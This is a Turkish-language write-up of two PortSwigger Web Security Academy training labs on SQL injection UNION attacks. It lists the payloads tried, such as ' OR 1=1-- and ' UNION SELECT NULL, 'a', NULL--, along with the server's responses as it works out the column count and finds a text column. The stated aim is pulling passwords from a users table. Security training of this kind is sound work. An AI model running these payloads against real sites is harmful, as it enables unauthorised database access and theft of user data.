# Proje 6.2: SQL Injection (SQLi) - UNION Saldırısı Raporu

Bu rapor, PortSwigger Web Security Academy'deki "SQL injection UNION attack" (SQL Enjeksiyonu UNION Saldırısı) serisinin çözüm sürecini belgelemektedir. Bu süreç iki laboratuvarda tamamlanmıştır:

1.  **Lab: Determining the number of columns** (Sütun sayısının belirlenmesi)
2.  **Lab: Finding a column with a useful data type** (Kullanışlı veri türüne sahip bir sütun bulma)

**Platform:** PortSwigger Web Security Academy
**Araçlar:** Burp Suite Community Edition

---

## 1. Zafiyet Analizi (Vulnerability Analysis)

Hedef laboratuvar, bir e-ticaret sitesindeki ürün kategorisi filtresinde SQLi açığı barındırmaktaydı. URL'den (`/filter?category=...`) gelen parametre, `String` (metin) tabanlı bir SQL sorgusuna doğrudan dahil edilmekteydi.

```sql
SELECT * FROM products WHERE category = '[GİRDİ]' AND released = 1
Bu zafiyet, ' OR 1=1-- gibi basit saldırıların yanı sıra, UNION operatörünü kullanarak mevcut sorguya ekstra veriler (başka tablolardan) eklememize de olanak tanır.

2. Saldırı Süreci (Attack Process)
UNION saldırısı yapabilmek için iki kritik bilgiye ihtiyaç vardır:

Orijinal sorgunun döndürdüğü sütun sayısı.

Veri sızdırmak istediğimiz sütun(lar)ın veri türü (örn: metin/string).

Adım 1: Sütun Sayısını Keşfetme (Lab 1)
Hedef: Orijinal sorgunun (SELECT * FROM products...) kaç sütun döndürdüğünü bulmak.

Yöntem: UNION operatörü, iki sorgunun sütun sayıları tam olarak eşleşmediğinde hata verir ("500 Internal Server Error"). Bu hatayı, ' UNION SELECT NULL-- komutundaki NULL sayısını artırarak deneme-yanılma yapmak için kullandık.

Deneme 1 (1 Sütun):

Payload: ' UNION SELECT NULL--

Sonuç: 500 Internal Server Error (Hata)

Deneme 2 (2 Sütun):

Payload: ' UNION SELECT NULL, NULL--

Sonuç: 500 Internal Server Error (Hata)

Deneme 3 (3 Sütun):

Payload: ' UNION SELECT NULL, NULL, NULL--

Sonuç: 200 OK (Başarılı)

Bulgu: Sunucu "500 Error" hatası vermeyi bıraktı. Bu, orijinal sorgunun 3 sütun döndürdüğünü kanıtlar.

Adım 2: Metin (String) Veri Türünü Keşfetme (Lab 2)
Hedef: O 3 sütundan hangisinin "metin" (string) veri kabul ettiğini bulmak. Bu, users tablosundan şifreler gibi metinleri çekebilmek için gereklidir.

Yöntem: NULL değerlerini, 'a' gibi rastgele bir metin (string) ile tek tek değiştirerek deneme-yanılma yaptık.

Deneme 1 (Sütun 1 Metin mi?):

Payload: ' UNION SELECT 'a', NULL, NULL--

Sonuç: 500 Internal Server Error (Hata)

Analiz: 1. Sütun metin kabul etmiyor (muhtemelen sayı veya tarih bekliyor).

Deneme 2 (Sütun 2 Metin mi?):

Payload: ' UNION SELECT NULL, 'a', NULL--

Sonuç: 200 OK (Başarılı)

Analiz: Sayfa hata vermeden yüklendi. 2. Sütunun metin kabul ettiği doğrulandı.

Deneme 3 (Sütun 3 Metin mi?):

Payload: ' UNION SELECT NULL, NULL, 'a'--

Sonuç: 500 Internal Server Error (Hata)

Analiz: 3. Sütun da metin kabul etmiyor.

3. Sonuç (Result)
İkinci laboratuvarı (finding a column containing text) çözmek için, laboratuvarın açıklamasında verilen rastgele metni ([LABORATUVARIN_VERDİĞİ_ÖZEL_METİN]), metin kabul eden 2. sütuna yerleştirdik:

' UNION SELECT NULL, '[ÖZEL_METİN]', NULL--

Bu payload, sayfada o özel metnin görünmesini sağladı ve laboratuvar çözüldü.

Öğrenilenler:

UNION saldırıları için sütun sayısının deneme-yanılma (NULL ekleyerek) ile nasıl bulunacağı.

Sütunların veri türlerinin (örn: metin) NULL yerine 'a' gibi değerler koyarak nasıl test edileceği.